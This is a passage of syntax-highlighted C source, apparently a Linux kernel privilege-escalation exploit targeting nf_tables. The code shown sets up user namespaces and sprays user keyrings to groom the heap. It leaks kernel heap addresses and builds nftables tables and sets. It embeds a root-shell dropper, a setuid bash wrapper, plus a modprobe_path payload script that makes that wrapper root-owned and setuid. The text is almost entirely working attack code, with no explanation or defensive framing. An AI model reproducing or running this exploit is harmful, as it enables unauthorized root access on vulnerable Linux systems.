class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libmnl/libmnl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/chain.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/expr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/rule.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/table.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/set.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nf_tables.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nfnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ethtool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MQUEUE_NUM 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAMELEN 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR_PREFIX <span class="meta-string">&quot;err: &quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DESC_MAX_SIZE 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREFIX_BUF_LEN 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RCU_HEAD_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_KEY_SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYSMAP_MASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_SIZE 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NB_ENTRIES 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> base_base;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_trans_phase</span> &#123;</span></span><br><span class="line">        NFT_TRANS_PREPARE,</span><br><span class="line">        NFT_TRANS_ABORT,</span><br><span class="line">        NFT_TRANS_COMMIT,</span><br><span class="line">        NFT_TRANS_RELEASE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[BUFFER];</span><br><span class="line">&#125; Msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">keyring_payload</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">uint8_t</span> rcu_buf[RCU_HEAD_LEN];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">leak</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> kaslr_base;</span><br><span class="line">    <span class="keyword">long</span> physmap_base;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> *<span class="title">params</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> <span class="keyword">key_serial_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_file[] = <span class="string">&quot;/tmp/shell.c\0&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_file[] = <span class="string">&quot;/tmp/dummy\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_context[] = <span class="string">&quot;#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char **argv)&#123;if (geteuid() == 0)&#123;setuid(0);setgid(0);puts(\&quot;[+] I am root\&quot;);system(\&quot;bash\&quot;);&#125;&#125;\x00&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_content[] = <span class="string">&quot;\xff\xff\xff\xff&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> new_modprobe_content[] = <span class="string">&quot;#!/bin/bash\n\nchown root:root /tmp/shell\nchmod 4555 /tmp/shell\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">key_serial_t</span> <span class="title">add_key</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *type, <span class="keyword">const</span> <span class="keyword">char</span> *description, <span class="keyword">const</span> <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen, <span class="keyword">key_serial_t</span> ringid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, type, description, payload, plen, ringid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">keyctl</span><span class="params">(<span class="keyword">int</span> operation, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_error_exit</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye2</span><span class="params">(<span class="keyword">char</span> *info, <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(info, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring</span><span class="params">(<span class="keyword">uint32_t</span> start, <span class="keyword">uint32_t</span> spray_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        bye(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = start; i &lt; start+spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, <span class="string">&quot;SPRAY-RING-%03du&quot;</span>, i);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, key_desc, key_desc, <span class="built_in">strlen</span>(key_desc), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_del_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> prev, <span class="keyword">uint64_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// next[0x8] = prev, prev[0x0] = next allocation occured at gather mqueue</span></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;next, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;prev, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, <span class="string">&quot;12341234&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;size, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, <span class="number">0x20</span>, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_overwrite_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> len, <span class="keyword">uint64_t</span> off_18, </span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="keyword">uint64_t</span> off_20, <span class="keyword">uint64_t</span> off_28, <span class="keyword">uint64_t</span> off_30, <span class="keyword">uint64_t</span> off_38)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">switch</span>((len<span class="number">-1</span>)/<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;off_18, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;off_20, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, &amp;off_28, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;off_30, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x20</span>, &amp;off_38, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            bye(<span class="string">&quot;add_key - assert(len &lt;= 0x28)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, temp);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, len, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_keyring_leak</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        keylen = keyctl(KEYCTL_READ, id_buffer[i], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;buffer[<span class="number">6</span>],<span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            heap_base = *((<span class="keyword">uint64_t</span>*)buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] leak successed, kmalloc-64 heap: 0x%llx\n&quot;</span>, heap_base);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] leak failed, idkval: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> id_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">awake_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line">    keylen = keyctl(KEYCTL_UPDATE, id_buffer[idx], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(id_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">int</span> i)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_stable_table_and_set</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">char</span> * set_name = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a table for the sets to be associated with</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_stable</span> =</span>  nftnl_set_alloc();</span><br><span class="line">    set_name = <span class="string">&quot;set_stable&quot;</span>;</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// expressions</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add set_stable</span></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span 